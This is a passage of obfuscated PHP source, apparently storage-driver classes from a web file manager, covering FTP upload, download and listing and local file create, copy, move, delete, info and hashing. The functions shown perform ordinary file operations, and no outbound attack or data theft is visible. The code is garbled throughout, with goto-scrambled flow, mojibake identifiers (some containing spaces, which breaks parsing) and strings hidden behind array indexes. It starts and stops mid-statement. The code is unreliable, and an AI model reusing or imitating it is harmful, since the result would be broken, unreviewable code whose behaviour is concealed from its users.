bÕíÚúáÖ; CƒÍ⁄øÎå: file_put_contents($BÃ´µ”Ù·ı, $C¿Û˘ÇπëΩ); $cëã∫Ñõ∞Ù = $this->upload($D®—¿·¶¥†, $this->iconvApp($BÃ´µ”Ù·ı)); $this->tempFileRemve($BÃ´µ”Ù·ı); goto d“£à˜∑ïü; bÕíÚúáÖ: if (!$this->_isconn()) { return !1; } $EÒÌû‰≥•¿ = $this->pathThis($this->iconvSystem($D®—¿·¶¥†)); $BÃ´µ”Ù·ı = $this->tempFile($EÒÌû‰≥•¿); goto CƒÍ⁄øÎå; d“£à˜∑ïü: return $cëã∫Ñõ∞Ù; goto CÑç©ªØ®Í; CÑç©ªØ®Í: } public function fileSubstr($aàòÕÜ÷ıÂ, $bÛ√∫öÆìæ = 0, $B∫àº„ø∞˘ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($aàòÕÜ÷ıÂ, $bÛ√∫öÆìæ, $B∫àº„ø∞˘); } private function ftpRequest($EΩÌçà ÚÊ, $Bµ√Í°Ñ∆Œ = 0, $aƒ ∆´´Í¢ = false) { goto Fœ†ù∏°∆ò; BÊ≠†¥´†Õ: curl_setopt($A±‡√ÜïÕè, CURLOPT_URL, $aì¢ò∞ÂÜä . $this->pathEncode($EΩÌçà ÚÊ)); curl_setopt($A±‡√ÜïÕè, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($aƒ ∆´´Í¢) { $c†å¯—ü˘ß = $Bµ√Í°Ñ∆Œ + $aƒ ∆´´Í¢ - 1; curl_setopt($A±‡√ÜïÕè, CURLOPT_RANGE, "{$Bµ√Í°Ñ∆Œ}\55{$c†å¯—ü˘ß}"); } goto e⁄®á∞êƒâ; e⁄®á∞êƒâ: curl_setopt($A±‡√ÜïÕè, CURLOPT_RETURNTRANSFER, 1); $CáƒäÇóÈÎ = curl_exec($A±‡√ÜïÕè); curl_close($A±‡√ÜïÕè); goto e£â†„‹á; e£â†„‹á: return $CáƒäÇóÈÎ; goto D”Ñ¢ê€´¬; Fœ†ù∏°∆ò: $EΩÌçà ÚÊ = $this->iconvSystem($EΩÌçà ÚÊ); $aì¢ò∞ÂÜä = $this->scheme . $this->host . $_SERVER[¯èãÄπµ][4] . $this->port; $A±‡√ÜïÕè = curl_init(); goto BÊ≠†¥´†Õ; D”Ñ¢ê€´¬: } public function upload($b˘Íù´ì±Û, $EÈﬂ»Ç£Ì≤, $E’–πÌÖèñ = false, $f®—ê€ƒÛΩ = REPEAT_REPLACE) { goto føÌÉ‰ê¿Ó; føÌÉ‰ê¿Ó: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($b˘Íù´ì±Û))) { return !1; } $b˘Íù´ì±Û = $this->iconvSystem($b˘Íù´ì±Û); goto A˘±ÖåâÀ°; C–†äŸ¡µÔ: if ($F≥¨‘ó∞πô != FTP_FINISHED) { return !1; } return $this->getPathOuter($b˘Íù´ì±Û); goto B†ıÏ≈êèè; A˘±ÖåâÀ°: $EÈﬂ»Ç£Ì≤ = $this->iconvSystem($EÈﬂ»Ç£Ì≤); $F≥¨‘ó∞πô = ftp_nb_put($this->connect, $b˘Íù´ì±Û, $EÈﬂ»Ç£Ì≤, FTP_BINARY); while ($F≥¨‘ó∞πô == FTP_MOREDATA) { $F≥¨‘ó∞πô = ftp_nb_continue($this->connect); } goto C–†äŸ¡µÔ; B†ıÏ≈êèè: } public function download($A‹û˘ÿ≠ÖÌ, $A€“ùª¿Œ÷ = '') { goto F˜◊ÃÑ°ìß; aŒèß˜ìÃ°: $A‹û˘ÿ≠ÖÌ = $this->iconvSystem($A‹û˘ÿ≠ÖÌ); $A€“ùª¿Œ÷ = $this->iconvSystem($A€“ùª¿Œ÷); $bÌùÂŒ≤Œ∑ = ftp_nb_get($this->connect, $A€“ùª¿Œ÷, $A‹û˘ÿ≠ÖÌ, FTP_BINARY); goto c«˘¢©åæƒ; F˜◊ÃÑ°ìß: if (!$this->_isconn()) { return !1; } $C⁄◊ñ†Îì€ = $this->pathFather($A€“ùª¿Œ÷); if (!IO::mkdir($C⁄◊ñ†Îì€)) { return !1; } goto aŒèß˜ìÃ°; c«˘¢©åæƒ: while ($bÌùÂŒ≤Œ∑ == FTP_MOREDATA) { $bÌùÂŒ≤Œ∑ = ftp_nb_continue($this->connect); } if ($bÌùÂŒ≤Œ∑ != FTP_FINISHED) { return !1; } return $this->iconvApp($A€“ùª¿Œ÷); goto Cå‰⁄ÚΩè∂; Cå‰⁄ÚΩè∂: } private function ftpList($E∑——Ç≤•™) { goto Dè∂¯ôÒÂë; Fº¯§´Àè: $E∑——Ç≤•™ = rtrim($E∑——Ç≤•™, $AƒÔ⁄’˜µº[8]) . $AƒÔ⁄’˜µº[8]; $bªõ≠œáàπ = @ftp_nlist($this->connect, $E∑——Ç≤•™); if ($bªõ≠œáàπ === !1) { $bªõ≠œáàπ = @ftp_rawlist($this->connect, $E∑——Ç≤•™); foreach ($bªõ≠œáàπ as $fÜŸö—õÛ› => $Böøê≠äæΩ) { $bªõ≠œáàπ[$fÜŸö—õÛ›] = end(explode($AƒÔ⁄’˜µº[1158], $Böøê≠äæΩ)); } } goto A«ÖÈÏïÖá; A«ÖÈÏïÖá: $FÀ≥åÎ€‹Ö = array(); foreach ($bªõ≠œáàπ as $B‚ë∆≈ÍëÚ) { if ($B‚ë∆≈ÍëÚ == $AƒÔ⁄’˜µº[91] || $B‚ë∆≈ÍëÚ == $AƒÔ⁄’˜µº[1159]) { continue; } if (!strstr($B‚ë∆≈ÍëÚ, $AƒÔ⁄’˜µº[8])) { $B‚ë∆≈ÍëÚ = $E∑——Ç≤•™ . ltrim($B‚ë∆≈ÍëÚ, $AƒÔ⁄’˜µº[8]); } $FÀ≥åÎ€‹Ö[] = $this->iconvApp($B‚ë∆≈ÍëÚ); } return $FÀ≥åÎ€‹Ö; goto C÷ùæ†é›§; Dè∂¯ôÒÂë: $AƒÔ⁄’˜µº =& $_SERVER[¯èãÄπµ]; if (!$this->isFolder($E∑——Ç≤•™)) { return !1; } @ftp_chdir($this->connect, $AƒÔ⁄’˜µº[8]); goto Fº¯§´Àè; C÷ùæ†é›§: } private function recursionFtpFiles($f‚éñ´€—›, &$cﬂº¬≥õ·Ï) { $f“≥πÔ≤‘˜ =& $_SERVER[¯èãÄπµ]; if (!$this->_isconn()) { return !1; } if (!($C°öÙú‹”ø = $this->ftpList($f‚éñ´€—›))) { return !1; } foreach ($C°öÙú‹”ø as $f‚éñ´€—›) { if ($this->isFolder($f‚éñ´€—›)) { $this->recursionFtpFiles($f‚éñ´€—›, $cﬂº¬≥õ·Ï); $cﬂº¬≥õ·Ï[$f“≥πÔ≤‘˜[74]][] = $f‚éñ´€—›; } else { $cﬂº¬≥õ·Ï[$f“≥πÔ≤‘˜[73]][] = $f‚éñ´€—›; } } } private function objectMeta($Cç÷•îƒóê) { goto b¡˜©Ã‹§‚; AÓ©´é°¶Õ: return $cÓƒô˜·Øå; goto dèÊâø† ˘; b¡˜©Ã‹§‚: $cÇ≤ﬁÌ°ôË =& $_SERVER[¯èãÄπµ]; $FÕºóßˆ–ﬁ = $cÇ≤ﬁÌ°ôË[1160] . md5($Cç÷•îƒóê); $cÓƒô˜·Øå = Cache::get($FÕºóßˆ–ﬁ); goto eÔ»â»áÉÇ; FíóéÕ∂©≤: $AòéÜ‡–ãõ = @ftp_size($this->connect, $this->iconvSystem($Cç÷•îƒóê)); if ($AòéÜ‡–ãõ != -1) { $cÓƒô˜·Øå = array($cÇ≤ﬁÌ°ôË[77] => $AòéÜ‡–ãõ, $cÇ≤ﬁÌ°ôË[29] => $cÇ≤ﬁÌ°ôË[163]); } else { $cÊπ£ˆÜó‘ = @ftp_chdir($this->connect, $this->iconvSystem($Cç÷•îƒóê)); $cÓƒô˜·Øå = $cÊπ£ˆÜó‘ ? array($cÇ≤ﬁÌ°ôË[77] => 0, $cÇ≤ﬁÌ°ôË[29] => $cÇ≤ﬁÌ°ôË[76]) : !1; } Cache::set($FÕºóßˆ–ﬁ, $cÓƒô˜·Øå, 0); goto AÓ©´é°¶Õ; eÔ»â»áÉÇ: if ($cÓƒô˜·Øå !== null && $cÓƒô˜·Øå !== !1) { return $cÓƒô˜·Øå; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $cÇ≤ﬁÌ°ôË[8]); goto FíóéÕ∂©≤; dèÊâø† ˘: } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($d⁄†Èí∫∆) { if (substr($d⁄†Èí∫∆, 0, 2) == $_SERVER[¯èãÄπµ][1149]) { $d⁄†Èí∫∆ = BASIC_PATH . substr($d⁄†Èí∫∆, 2); } return $d⁄†Èí∫∆; } public function iconvApp($aëÜ∆⁄‘‚¡) { $B™‚˜ºÏáÿ =& $_SERVER[¯èãÄπµ]; global $config; return $this->iconvTo($aëÜ∆⁄‘‚¡, $config[$B™‚˜ºÏáÿ[1147]], $config[$B™‚˜ºÏáÿ[1146]]); } public function iconvSystem($Bœ‚“¶¿œˆ) { $bÓÇúïîõÔ =& $_SERVER[¯èãÄπµ]; global $config; return $this->iconvTo($Bœ‚“¶¿œˆ, $config[$bÓÇúïîõÔ[1146]], $config[$bÓÇúïîõÔ[1147]]); } public function getPathOuter($f®¨·Ωê¡¬) { goto c…ä†ÈÏ…ü; E©ì«¯Üè∑: if (substr($BÈﬁ„–É√‘, 0, 2) == $cã—ø‡¨±Ü[1149]) { $BÈﬁ„–É√‘ = BASIC_PATH . substr($BÈﬁ„–É√‘, 2); } if (substr($f®¨·Ωê¡¬, 0, 2) == $cã—ø‡¨±Ü[1149]) { $f®¨·Ωê¡¬ = BASIC_PATH . substr($f®¨·Ωê¡¬, 2); } $BÈﬁ„–É√‘ = KodIO::clear($BÈﬁ„–É√‘); goto E≤—˜–Ççä; c…ä†ÈÏ…ü: $cã—ø‡¨±Ü =& $_SERVER[¯èãÄπµ]; $BÈﬁ„–É√‘ = $this->iconvApp($this->pathBase); $f®¨·Ωê¡¬ = $this->iconvApp($f®¨·Ωê¡¬); goto E©ì«¯Üè∑; eØÓÒØèÀ: return $this->pathDriver . $cã—ø‡¨±Ü[8] . ltrim($f®¨·Ωê¡¬, $cã—ø‡¨±Ü[8]); goto aÃüœàˆ«⁄; E≤—˜–Ççä: $f®¨·Ωê¡¬ = KodIO::clear($f®¨·Ωê¡¬); $f®¨·Ωê¡¬ = substr($f®¨·Ωê¡¬, strlen($BÈﬁ„–É√‘)); if (empty($this->pathDriver)) { return $f®¨·Ωê¡¬; } goto eØÓÒØèÀ; aÃüœàˆ«⁄: } public function mkfile($aç≈Ûñ’•’, $AèÉ“⁄ï¶ = '', $b¡ü£∂∏Ôä = REPEAT_RENAME) { $aç≈Ûñ’•’ = $this->iconvSystem($aç≈Ûñ’•’); @touch($aç≈Ûñ’•’); if ($AèÉ“⁄ï¶) { file_put_contents($aç≈Ûñ’•’, $AèÉ“⁄ï¶); } return is_file($aç≈Ûñ’•’) ? $this->getPathOuter($aç≈Ûñ’•’) : !1; } public function mkdir($cÑ√‘µÒÚ«, $eËúèèËº† = REPEAT_SKIP) { $cÑ√‘µÒÚ« = $this->iconvSystem($cÑ√‘µÒÚ«); if (is_dir($cÑ√‘µÒÚ«)) { return $this->getPathOuter($cÑ√‘µÒÚ«); } @mkdir($cÑ√‘µÒÚ«, 511, !0); return is_dir($cÑ√‘µÒÚ«) ? $this->getPathOuter($cÑ√‘µÒÚ«) : !1; } public function copyFile($fÇ±Ü…Ç‡‹, $DÇôÎâﬁŸØ) { $this->mkdir($this->pathFather($DÇôÎâﬁŸØ)); $fÇ±Ü…Ç‡‹ = $this->iconvSystem($fÇ±Ü…Ç‡‹); $DÇôÎâﬁŸØ = $this->iconvSystem($DÇôÎâﬁŸØ); $F∂ü·Æë‡É = @copy($fÇ±Ü…Ç‡‹, $DÇôÎâﬁŸØ); return $F∂ü·Æë‡É ? $this->getPathOuter($DÇôÎâﬁŸØ) : !1; } public function moveFile($E‰êÎ˜©â˘, $dÔ÷è›ƒ Ü) { $this->mkdir($this->pathFather($dÔ÷è›ƒ Ü)); $E‰êÎ˜©â˘ = $this->iconvSystem($E‰êÎ˜©â˘); $dÔ÷è›ƒ Ü = $this->iconvSystem($dÔ÷è›ƒ Ü); $e∂„Ô◊Ö©™ = intval(@rename($E‰êÎ˜©â˘, $dÔ÷è›ƒ Ü)); if (!$e∂„Ô◊Ö©™) { if ($e∂„Ô◊Ö©™ = intval(@copy($E‰êÎ˜©â˘, $dÔ÷è›ƒ Ü))) { @unlink($E‰êÎ˜©â˘); } } return $e∂„Ô◊Ö©™ ? $this->getPathOuter($dÔ÷è›ƒ Ü) : !1; } public function delFile($fŒ„™ êˆ£) { $fŒ„™ êˆ£ = $this->iconvSystem($fŒ„™ êˆ£); if (!@unlink($fŒ„™ êˆ£)) { @chmod($fŒ„™ êˆ£, 511); if (!@unlink($fŒ„™ êˆ£)) { return !1; } } else { return !0; } } public function delFolder($DŒ˘ƒ∫æœπ) { goto EÑ‚Ç‰’‚ÿ; EÑ‚Ç‰’‚ÿ: $fﬂ¡‹çç≈ô =& $_SERVER[¯èãÄπµ]; $DŒ˘ƒ∫æœπ = $this->iconvSystem($DŒ˘ƒ∫æœπ); if (!is_dir($DŒ˘ƒ∫æœπ)) { return !0; } goto c∞≤ÿ∑‰˜ê; c∞≤ÿ∑‰˜ê: if (!($aø›ì˜¥Â∏ = opendir($DŒ˘ƒ∫æœπ))) { return !1; } while (($EùÑ è›ÉŸ = readdir($aø›ì˜¥Â∏)) !== !1) { if ($EùÑ è›ÉŸ == $fﬂ¡‹çç≈ô[91] || $EùÑ è›ÉŸ == $fﬂ¡‹çç≈ô[1159]) { continue; } $Cµﬁ“œ∏“¬ = $DŒ˘ƒ∫æœπ . $fﬂ¡‹çç≈ô[8] . $EùÑ è›ÉŸ; if (!is_dir($Cµﬁ“œ∏“¬)) { if (!unlink($Cµﬁ“œ∏“¬)) { chmod($Cµﬁ“œ∏“¬, 511); if (!unlink($Cµﬁ“œ∏“¬)) { return !1; } } } else { chmod($Cµﬁ“œ∏“¬, 511); $Cµﬁ“œ∏“¬ = $this->iconvApp($Cµﬁ“œ∏“¬); if (!$this->delFolder($Cµﬁ“œ∏“¬)) { return !1; } } } closedir($aø›ì˜¥Â∏); goto B¯∂õ”Ãú‰; B¯∂õ”Ãú‰: return rmdir($DŒ˘ƒ∫æœπ); goto Cåøê∂†∂â; Cåøê∂†∂â: } public function rename($F¶Ü™øŒÆà, $b·õ˘¯›õ∞) { goto e¢à∂÷øè€; e¢à∂÷øè€: $E«øñúÓèç =& $_SERVER[¯èãÄπµ]; $b≥ÿàÕ± Ã = $this->fileNameAuto($this->pathFather($F¶Ü™øŒÆà), $b·õ˘¯›õ∞); $b≥ÿàÕ± Ã = $this->iconvSystem($b≥ÿàÕ± Ã); goto F≠ﬂºëÖ; F≠ﬂºëÖ: $F¶Ü™øŒÆà = $this->iconvSystem($F¶Ü™øŒÆà); $DñíªÊ—≥∏ = $this->pathFather($F¶Ü™øŒÆà); $b≈ÜµÜÜã… = rtrim($DñíªÊ—≥∏, $E«øñúÓèç[8]) . $E«øñúÓèç[8] . $b≥ÿàÕ± Ã; goto C¶ôÙ√€îå; C¶ôÙ√€îå: $CÆ…Ÿˆëœ÷ = @rename($F¶Ü™øŒÆà, $b≈ÜµÜÜã…); $b≈ÜµÜÜã… = $this->iconvApp($b≈ÜµÜÜã…); return $CÆ…Ÿˆëœ÷ ? $this->getPathOuter($b≈ÜµÜÜã…) : !1; goto B•±ôÔêîÛ; B•±ôÔêîÛ: } public function size($c¡‡˘ª∏ÑÉ) { $c¡‡˘ª∏ÑÉ = $this->iconvSystem($c¡‡˘ª∏ÑÉ); return (double) abs(sprintf($_SERVER[¯èãÄπµ][1161], @filesize($c¡‡˘ª∏ÑÉ))); } public function info($E† Ûı¶Õà) { $E† Ûı¶Õà = $this->iconvSystem($E† Ûı¶Õà); if ($this->isFolder($E† Ûı¶Õà)) { return $this->folderInfo($E† Ûı¶Õà); } else { if ($this->isFile($E† Ûı¶Õà)) { return $this->fileInfo($E† Ûı¶Õà); } } return !1; } protected function infoChildren($D¯Àçë’±ä, &$Bï€ﬁ±öäÎ, $Eß¥≤ÂÚ˘ü = true) { $e˘àπÖ¯€¡ =& $_SERVER[¯èãÄπµ]; $D¯Àçë’±ä = rtrim($D¯Àçë’±ä, $e˘àπÖ¯€¡[8]) . $e˘àπÖ¯€¡[8]; if ($Eß¥≤ÂÚ˘ü) { check_abort(); $D¯Àçë’±ä = $this->iconvSystem($D¯Àçë’±ä); } if (!($DõÚéıß∫Ö = @opendir($D¯Àçë’±ä))) { return; } while (($Cçıá¶Õ¶§ = readdir($DõÚéıß∫Ö)) !== !1) { if ($Cçıá¶Õ¶§ == $e˘àπÖ¯€¡[91] || $Cçıá¶Õ¶§ == $e˘àπÖ¯€¡[1159]) { continue; } $d‰ú◊ÚË†≈ = $D¯Àçë’±ä . $Cçıá¶Õ¶§; if (is_file($d‰ú◊ÚË†≈)) { $Bï€ﬁ±öäÎ[$e˘àπÖ¯€¡[78]]++; $Bï€ﬁ±öäÎ[$e˘àπÖ¯€¡[77]] += (double) abs(sprintf($e˘àπÖ¯€¡[1161], @filesize($d‰ú◊ÚË†≈))); } else { $Bï€ﬁ±öäÎ[$e˘àπÖ¯€¡[79]]++; $this->infoChildren($d‰ú◊ÚË†≈, $Bï€ﬁ±öäÎ, !1); } } closedir($DõÚéıß∫Ö); } private function folderInfo($füêıÇóæÑ, $fÒ§Û´™≤ô = false) { $d¥®Ö‚≈Ìó =& $_SERVER[¯èãÄπµ]; $füêıÇóæÑ = rtrim($füêıÇóæÑ, $d¥®Ö‚≈Ìó[8]) . $d¥®Ö‚≈Ìó[8]; $cêÖïæœ‹ø = $this->iconvApp($this->pathThis($füêıÇóæÑ)); if ($fÒ§Û´™≤ô) { return array($d¥®Ö‚≈Ìó[28] => $cêÖïæœ‹ø, $d¥®Ö‚≈Ìó[75] => $this->getPathOuter($füêıÇóæÑ), $d¥®Ö‚≈Ìó[29] => $d¥®Ö‚≈Ìó[76]); } $aêƒÒÓå£® = array($d¥®Ö‚≈Ìó[28] => $cêÖïæœ‹ø, $d¥®Ö‚≈Ìó[75] => $this->getPathOuter($füêıÇóæÑ), $d¥®Ö‚≈Ìó[29] => $d¥®Ö‚≈Ìó[76], $d¥®Ö‚≈Ìó[183] => @filectime($füêıÇóæÑ), $d¥®Ö‚≈Ìó[106] => @filemtime($füêıÇóæÑ), $d¥®Ö‚≈Ìó[1162] => @fileatime($füêıÇóæÑ), $d¥®Ö‚≈Ìó[1156] => is_readable($füêıÇóæÑ), $d¥®Ö‚≈Ìó[1157] => is_writable($füêıÇóæÑ), $d¥®Ö‚≈Ìó[1163] => get_mode($füêıÇóæÑ)); return $aêƒÒÓå£®; } private function fileInfo($FÎûÃºÿ∫–, $Fä¿øÇ€Ó = false) { $B∑èøÉÕ‚Ï =& $_SERVER[¯èãÄπµ]; $fâ≤áê∏®Â = $this->iconvApp($this->pathThis($FÎûÃºÿ∫–)); if ($Fä¿øÇ€Ó) { return array($B∑èøÉÕ‚Ï[28] => $fâ≤áê∏®Â, $B∑èøÉÕ‚Ï[75] => $this->getPathOuter($FÎûÃºÿ∫–), $B∑èøÉÕ‚Ï[29] => $B∑èøÉÕ‚Ï[163], $B∑èøÉÕ‚Ï[77] => $this->size($FÎûÃºÿ∫–), $B∑èøÉÕ‚Ï[156] => $this->ext($fâ≤áê∏®Â)); } $fÀæ≈ﬂËìâ = array($B∑èøÉÕ‚Ï[28] => $fâ≤áê∏®Â, $B∑èøÉÕ‚Ï[75] => $this->getPathOuter($FÎûÃºÿ∫–), $B∑èøÉÕ‚Ï[29] => $B∑èøÉÕ‚Ï[163], $B∑èøÉÕ‚Ï[183] => @filectime($FÎûÃºÿ∫–), $B∑èøÉÕ‚Ï[106] => @filemtime($FÎûÃºÿ∫–), $B∑èøÉÕ‚Ï[1162] => @fileatime($FÎûÃºÿ∫–), $B∑èøÉÕ‚Ï[77] => $this->size($FÎûÃºÿ∫–), $B∑èøÉÕ‚Ï[156] => $this->ext($fâ≤áê∏®Â), $B∑èøÉÕ‚Ï[1156] => is_readable($FÎûÃºÿ∫–), $B∑èøÉÕ‚Ï[1157] => is_writable($FÎûÃºÿ∫–), $B∑èøÉÕ‚Ï[1163] => get_mode($FÎûÃºÿ∫–)); return $fÀæ≈ﬂËìâ; } public function exist($aØê¯Œ⁄”ô) { $aØê¯Œ⁄”ô = $this->iconvSystem($aØê¯Œ⁄”ô); return @file_exists($aØê¯Œ⁄”ô); } public function isFile($C·ıåäÂ£…) { $C·ıåäÂ£… = $this->iconvSystem($C·ıåäÂ£…); return @is_file($C·ıåäÂ£…); } public function isFolder($B±Ñò‡÷«’) { $B±Ñò‡÷«’ = $this->iconvSystem($B±Ñò‡÷«’); return @is_dir($B±Ñò‡÷«’); } public function listPath($DûÔ∏∫∑Í–, $dì∆’äÉ…Ì = false) { goto cŒ⁄¢ÉƒƒÊ; cÒ¯í⁄ãﬁÌ: closedir($B√ß∞ΩËØê); return $CÀ§öÈ©Öò; goto d¿Ωî∆îˆ±; cŒ⁄¢ÉƒƒÊ: $cäÍ∫¨§ª =& $_SERVER[¯èãÄπµ]; $DûÔ∏∫∑Í– = $this->iconvSystem($DûÔ∏∫∑Í–); $DûÔ∏∫∑Í– = rtrim($DûÔ∏∫∑Í–, $cäÍ∫¨§ª[8]) . $cäÍ∫¨§ª[8]; goto AÜ›ŸàÍ∂◊; AÜ›ŸàÍ∂◊: $CÀ§öÈ©Öò = array($cäÍ∫¨§ª[74] => array(), $cäÍ∫¨§ª[73] => array()); if (!($B√ß∞ΩËØê = @opendir($DûÔ∏∫∑Í–))) { return $CÀ§öÈ©Öò; } while (($A·ë™ÚäÀÖ = readdir($B√ß∞ΩËØê)) !== !1) { if ($A·ë™ÚäÀÖ == $cäÍ∫¨§ª[91] || $A·ë™ÚäÀÖ == $cäÍ∫¨§ª[1159]) { continue; } $Dæ∫Ã°√À® = $DûÔ∏∫∑Í– . $A·ë™ÚäÀÖ; if (is_file($Dæ∫Ã°√À®)) { $CÀ§öÈ©Öò[$cäÍ∫¨§ª[73]][] = $this->fileInfo($Dæ∫Ã°√À®, $dì∆’äÉ…Ì); } else { $CÀ§öÈ©Öò[$cäÍ∫¨§ª[74]][] = $this->folderInfo($Dæ∫Ã°√À®, $dì∆’äÉ…Ì); } } goto cÒ¯í⁄ãﬁÌ; d¿Ωî∆îˆ±: } public function listAll($bàçÓõ≠õç, &$bı·¶ÒΩŒ… = array()) { goto f®Í‚ˆûéí; e§í◊Ûàå˘: return $bı·¶ÒΩŒ…; goto e≤ÑÃÊúéá; f®Í‚ˆûéí: $bâÀÏ°¯Âæ =& $_SERVER[¯èãÄπµ]; $bàçÓõ≠õç = $this->iconvSystem($bàçÓõ≠õç); $bàçÓõ≠õç = rtrim($bàçÓõ≠õç, $bâÀÏ°¯Âæ[8]) . $bâÀÏ°¯Âæ[8]; goto bÀ·ﬁ‹‚Ûì; bÀ·ﬁ‹‚Ûì: if (!($eÍê„∫¶“Ø = @opendir($bàçÓõ≠õç))) { return $bı·¶ÒΩŒ…; } while (($c≠†•åôÇâ = readdir($eÍê„∫¶“Ø)) !== !1) { if ($c≠†•åôÇâ == $bâÀÏ°¯Âæ[91] || $c≠†•åôÇâ == $bâÀÏ°¯Âæ[1159]) { continue; } $aêÒß¬äëá = $bàçÓõ≠õç . $c≠†•åôÇâ; if (is_dir($aêÒß¬äëá)) { $bı·¶ÒΩŒ…[] = array($bâÀÏ°¯Âæ[75] => $aêÒß¬äëá . $bâÀÏ°¯Âæ[8], $bâÀÏ°¯Âæ[76] => 1, $bâÀÏ°¯Âæ[106] => @filemtime($aêÒß¬äëá), $bâÀÏ°¯Âæ[77] => 0); $this->listAll($aêÒß¬äëá, $bı·¶ÒΩŒ…); } else { $bı·¶ÒΩŒ…[] = array($bâÀÏ°¯Âæ[75] => $aêÒß¬äëá, $bâÀÏ°¯Âæ[76] => 0, $bâÀÏ°¯Âæ[106] => @filemtime($aêÒß¬äëá), $bâÀÏ°¯Âæ[77] => $this->size($aêÒß¬äëá)); } } closedir($eÍê„∫¶“Ø); goto e§í◊Ûàå˘; e≤ÑÃÊúéá: } public function has($F„†˜ÕÇñç, $Füå≠Ç©Íí = false, $dê™êÒ‚Ö∏ = true) { goto Bﬁå€âËò—; aÂ∑ùî‘‰π: if (!($F≤”äπáŸè = @opendir($F„†˜ÕÇñç))) { return !1; } $eËâ∑¶ÍîÙ = 0; $Fåç¡∆≤Îñ = 0; goto D’ÛÖó”áà; fˆ‚¨â™Ï≈: return !1; goto FË¥∆ΩºπÒ; Bﬁå€âËò—: $fïåÎﬂê‹£ =& $_SERVER[¯èãÄπµ]; $F„†˜ÕÇñç = $this->iconvSystem($F„†˜ÕÇñç); $F„†˜ÕÇñç = rtrim($F„†˜ÕÇñç, $fïåÎﬂê‹£[8]) . $fïåÎﬂê‹£[8]; goto aÂ∑ùî‘‰π; D’ÛÖó”áà: while (($d⁄©≠•–†± = readdir($F≤”äπáŸè)) !== !1) { if ($d⁄©≠•–†± == $fïåÎﬂê‹£[91] || $d⁄©≠•–†± == $fïåÎﬂê‹£[1159]) { continue; } $bﬁË≥Ω’ÖÆ = $F„†˜ÕÇñç . $d⁄©≠•–†±; if ($Füå≠Ç©Íí) { if (@is_file($bﬁË≥Ω’ÖÆ)) { $eËâ∑¶ÍîÙ++; } else { $Fåç¡∆≤Îñ++; } continue; } if ($dê™êÒ‚Ö∏) { if (@is_file($bﬁË≥Ω’ÖÆ)) { return !0; } } else { if (@is_dir($bﬁË≥Ω’ÖÆ . $fïåÎﬂê‹£[8])) { return !0; } } } closedir($F≤”äπáŸè); if ($Füå≠Ç©Íí) { return array($fïåÎﬂê‹£[187] => $eËâ∑¶ÍîÙ, $fïåÎﬂê‹£[188] => $Fåç¡∆≤Îñ); } goto fˆ‚¨â™Ï≈; FË¥∆ΩºπÒ: } public function hashSimple($dÔ˜„ó‹±ﬁ) { goto FáºôÊﬁõû; Eè∞í‚æ£á: $Fûß„ïƒÃ¥ = $this->size($dÔ˜„ó‹±ﬁ); $aïñË∫≤ú¡ = 200; $F£óÚ´”ıà = 50; goto BõåçêŸÑ•; BõåçêŸÑ•: if ($Fûß„ïƒÃ¥ <= $aïñË∫≤ú¡ * $F£óÚ´”ıà) { return $this->hashMd5($dÔ˜„ó‹±ﬁ) . $Fûß„ïƒÃ¥; } $E∂È‚√›Ûﬁ = $eŒÖÇ–ıˆ©[33]; $Eëíêüˆã¢ = intval($Fûß„ïƒÃ¥ / $F£óÚ´”ıà); goto eπ¶ƒæ√€ì; Cˆ‹Ñ«Ñ»Ö: return md5($E∂È‚√›Ûﬁ) . $Fûß„ïƒÃ¥; goto e¬äèÑÙ¿¢; bﬂ¢ÇÖëäè: fseek($E˘Úëíœ£¡, $Fûß„ïƒÃ¥ - $aïñË∫≤ú¡); $E∂È‚√›Ûﬁ .= fread($E˘Úëíœ£¡, $aïñË∫≤ú¡); fclose($E˘Úëíœ£¡); goto Cˆ‹Ñ«Ñ»Ö; FáºôÊﬁõû: $eŒÖÇ–ıˆ© =& $_SERVER[¯èãÄπµ]; if (!$dÔ˜„ó‹±ﬁ) { return md5($eŒÖÇ–ıˆ©[33]); } $dÔ˜„ó‹±ﬁ = $this->iconvSystem($dÔ˜„ó‹±ﬁ); goto Eè∞í‚æ£á; eπ¶ƒæ√€ì: $E˘Úëíœ£¡ = fopen($dÔ˜„ó‹±ﬁ, $eŒÖÇ–ıˆ©[1164]); if (!$E˘Úëíœ£¡) { return $E∂È‚√›Ûﬁ; } for ($C§áè±Öã¥ = 0; $C§áè±Öã¥ < $F£óÚ´”ıà; $C§áè±Öã¥++) { fseek($E˘Úëíœ£¡, $Eëíêüˆã¢ * $C§áè±Öã¥); $E∂È‚√›Ûﬁ .= fread($E˘Úëíœ£¡, $aïñË∫≤ú¡); } goto bﬂ¢ÇÖëäè; e¬äèÑÙ¿¢: } public function getContent($FîòáÌ°…ä) { $FîòáÌ°…ä = $this->iconvSystem($FîòáÌ°…ä); return file_get_contents($FîòáÌ°…ä); } public function setContent($aã ÃÒàÍ≤, $Aò˜é¡±æµ = '') { $aã ÃÒàÍ≤ = $this->iconvSystem($aã ÃÒàÍ≤); @file_put_contents($aã ÃÒàÍ≤, $Aò˜é¡±æµ, LOCK_EX); clearstatcache(); return strlen($Aò˜é¡±æµ) == filesize($aã ÃÒàÍ≤); } public function fileSubstr($bÆ˘Âß”ïæ, $D≠¨Ì‰√í… = 0, $a«Â®È∆à∑ = false) { goto dÚ£§°ÿ¢Ô; FÚå¥◊ç≠–: if ($a«Â®È∆à∑ <= 0) { return $d»ñÿà‘ç¡[33]; } $B™ﬂ¯·¿î– = fopen($bÆ˘Âß”ïæ, $d»ñÿà‘ç¡[1164]); if (!$B™ﬂ¯·¿î–) { return !1; } goto b•‰äî…ÀÕ; dÚ£§°ÿ¢Ô: $d»ñÿà‘ç¡ =& $_SERVER[¯èãÄπµ]; $bÆ˘Âß”ïæ = $this->iconvSystem($bÆ˘Âß”ïæ); if ($a«Â®È∆à∑ === !1) { $a«Â®È∆à∑ = $this->size($bÆ˘Âß”ïæ); } goto FÚå¥◊ç≠–; b•‰äî…ÀÕ: fseek($B™ﬂ¯·¿î–, $D≠¨Ì‰√í…); $b⁄‰Ò’éËˆ = fread($B™ﬂ¯·¿î–, $a«Â®È∆à∑); fclose($B™ﬂ¯·¿î–); goto DŒÂ¥ë¬ñ„; DŒÂ¥ë¬ñ„: return $b⁄‰Ò’éËˆ; goto 